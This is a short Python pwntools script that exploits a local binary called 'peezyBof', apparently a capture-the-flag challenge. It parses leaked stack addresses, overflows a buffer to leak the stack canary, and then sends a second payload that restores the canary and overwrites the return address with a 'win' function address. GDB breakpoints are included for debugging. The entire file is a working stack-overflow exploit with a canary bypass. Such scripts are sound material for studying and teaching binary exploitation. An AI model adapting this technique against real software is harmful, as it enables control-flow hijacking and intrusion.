#!/usr/bin/env python3
from pwn import *

binary = './peezyBof'
elf = ELF(binary)
win_addr = 0x401236

# Test locally with GDB
context.log_level = 'debug'
target = process(binary)

# Parse INFO
info = target.recvuntil(b'=== === === === === === ===\n').decode()
print(info)

import re
canary_addr = int(re.search(r'\[info\] \?\?\? addr\s+: (0x[0-9a-f]+)', info).group(1), 16)
ret_addr = int(re.search(r'\[info\] RET slot addr\s+: (0x[0-9a-f]+)', info).group(1), 16)
buf_addr = int(re.search(r'\[info\] buf addr\s+: (0x[0-9a-f]+)', info).group(1), 16)

offset_to_canary = canary_addr - buf_addr
offset_to_ret = ret_addr - buf_addr

print(f"Canary offset: {offset_to_canary}")
print(f"RET offset: {offset_to_ret}")

target.recvuntil(b'What\'s your name : ')

# Stage 1: Leak
payload1 = b'A' * 40 + b'\xff'
target.send(payload1)

target.recvuntil(b'Your input : ')
leaked = target.recvuntil(b'\n')
print(f"Leaked: {leaked}")
print(f"Leaked hex: {leaked.hex()}")

# Extract canary
canary_bytes = leaked[41:48]
print(f"Canary bytes (7): {canary_bytes.hex()}")
canary = u64(b'\x00' + canary_bytes)
print(f"Reconstructed canary: {hex(canary)}")

# Stage 2
target.recvuntil(b'Is this correct? (Yes/No) > ')

# Try just the canary first to see if it's correct
payload2 = b'A' * 40
payload2 += p64(canary)
payload2 += b'B' * 8
payload2 += p64(win_addr)

print(f"Payload2 length: {len(payload2)}")
print(f"Payload2: {payload2.hex()}")

gdb.attach(target, '''
b *vuln+307
c
x/10gx $rbp-0x30
x/gx $rbp-8
x/gx $rbp
x/gx $rbp+8
''')

target.send(payload2)
target.interactive()
